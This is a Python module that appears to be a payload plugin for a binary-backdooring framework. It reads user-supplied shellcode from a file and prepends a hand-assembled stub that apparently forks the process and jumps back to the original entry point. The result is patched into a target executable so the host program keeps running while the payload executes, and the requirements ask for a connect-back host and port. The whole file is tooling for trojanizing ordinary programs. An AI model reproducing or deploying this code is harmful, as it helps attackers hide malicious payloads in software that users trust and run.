import struct
import os
import logging
from core import support
logger = logging.getLogger(__name__)
#eat_code_caves function is arch agnostic?
from common import common

class user_supplied_shellcode():

    def __init__(self):
        #could take this out HOST/PORT and put into each shellcode function
        #self.HOST = HOST
        #self.PORT = PORT
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = "user_supplied_shellcode"
        self.description = """user_supplied_shellcode (non-stager)"""
        self.requirements = {'MODE':'How the patching will happen',
                             'HOST':'<HOST to connect back to>',
                             'PORT':'<Port to connect back to>',
                             'SUPPLIED_SHELLCODE': '<time delay in secs',
                             'ENCODER': '<Encoder you want to use, else none>'
                            }
        self.supported_modes = ['remove_signature']
        self.shellcode = ""
        self.apis_needed = None
        self.payload_type = 'single'

        
    def invoke(self, PM):
        # Expose patching method objects
        
        self.PM = PM
        # Expose BDF method objects
        self.BDF = self.PM.BDF
        logger.debug(f"IN PAYLOAD DEBUG: {dir(self)}")
        logger.debug(dir(self.PM))
        if support.support(self).check_reqs() is False:
            return False
        
        return self.run()

    def run(self):

        self.shellcode2 = open(self.SUPPLIED_SHELLCODE, 'r+b').read()
        
        self.shellcode1 = b"\xB8\x02\x00\x00\x02\xcd\x80\x85\xd2"
        self.shellcode1 += b"\x0f\x84"
        if self.BDF.jumpLocation < 0:
            self.shellcode1 += struct.pack("<I", len(self.shellcode1) + 0xffffffff + self.BDF.jumpLocation)
        else:
            self.shellcode1 += struct.pack("<I", len(self.shellcode2) + self.BDF.jumpLocation)

        self.shellcode = self.shellcode1 + self.shellcode2
        
        return self.shellcode
